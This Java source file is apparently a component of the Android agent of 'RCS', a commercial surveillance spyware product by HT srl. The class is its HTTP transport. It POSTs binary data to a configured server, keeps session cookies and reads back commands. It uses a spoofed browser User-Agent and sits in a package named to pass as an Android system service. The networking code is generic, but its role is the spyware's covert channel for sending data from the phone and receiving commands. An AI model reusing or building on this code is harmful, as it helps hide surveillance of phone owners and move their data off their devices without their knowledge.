/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : HttpKeepAliveTransport.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action.sync;

import java.io.DataInputStream;
import java.io.IOException;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ConnectionKeepAliveStrategy;
import org.apache.http.cookie.Cookie;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public abstract class HttpKeepAliveTransport extends HttpTransport {
	private static final String TAG = "HttpKeepAliveTransport";
	DefaultHttpClient httpclient;

	public HttpKeepAliveTransport(String host) {
		super(host);
	
	}

	/**
	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
	 * httpclient
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	@Override
	public synchronized byte[] command(final byte[] data)
			throws TransportException {

		if(Cfg.DEBUG) Check.ensures(httpclient!=null, "call startSession before command");
		// httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY,
		// CookiePolicy.RFC_2965);

		final HttpPost httppost = new HttpPost(baseurl);
		httppost.setHeader(
				"User-Agent",
				"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3");
		httppost.setHeader("Content-Type", "application/octet-stream");

		if (cookies != null) {
			for (final Cookie cookie : cookies) {
				httpclient.getCookieStore().addCookie(cookie);
				// httppost.setHeader("Cookie", cookie.getName());
			}
		}

		DataInputStream in = null;

		try {
			httppost.setEntity(new ByteArrayEntity(data));
			final HttpResponse response = httpclient.execute(httppost);

			final int returnCode = response.getStatusLine().getStatusCode();

			if (returnCode == HttpStatus.SC_OK) {
				cookies = httpclient.getCookieStore().getCookies();

				final long length = response.getEntity().getContentLength();

				in = new DataInputStream(response.getEntity().getContent());

				final byte[] content = new byte[(int) length];
				in.readFully(content);

				in.close();

				return content;
			} else {
				return null;
			}
		} catch (final Exception ex) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex.toString());
			throw new TransportException(1);
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (final IOException e) {
					if(Cfg.DEBUG) { Check.log(e); }
				}
			}
		}

		// byte[] content = parseHttpConnection(connection);

	}
	

	@Override
	public void start() {
		HttpParams httpParameters = new BasicHttpParams();
		// Set the timeout in milliseconds until a connection is established.
		int timeoutConnection = 5000;
		HttpConnectionParams.setConnectionTimeout(httpParameters, timeoutConnection);
		// Set the default socket timeout (SO_TIMEOUT) 
		// in milliseconds which is the timeout for waiting for data.
		int timeoutSocket = 5000;
		HttpConnectionParams.setSoTimeout(httpParameters, timeoutSocket);
		
		httpclient = new DefaultHttpClient(httpParameters);

		//HttpParams httpParameters = new BasicHttpParams();
		// HttpConnectionParams.setConnectionTimeout(httpParameters,
		// CONNECTION_TIMEOUT);
		// HttpConnectionParams.setSoTimeout(httpParameters, SO_TIMEOUT);
		// httpclient.setParams(httpParameters);

		httpclient.setKeepAliveStrategy(new ConnectionKeepAliveStrategy() {
			public long getKeepAliveDuration(HttpResponse response,
					org.apache.http.protocol.HttpContext context) {
				return 5000;
			}
		});
	}

	@Override
	public void close() {
		cookies = null;
		httpclient = null;
	}
}
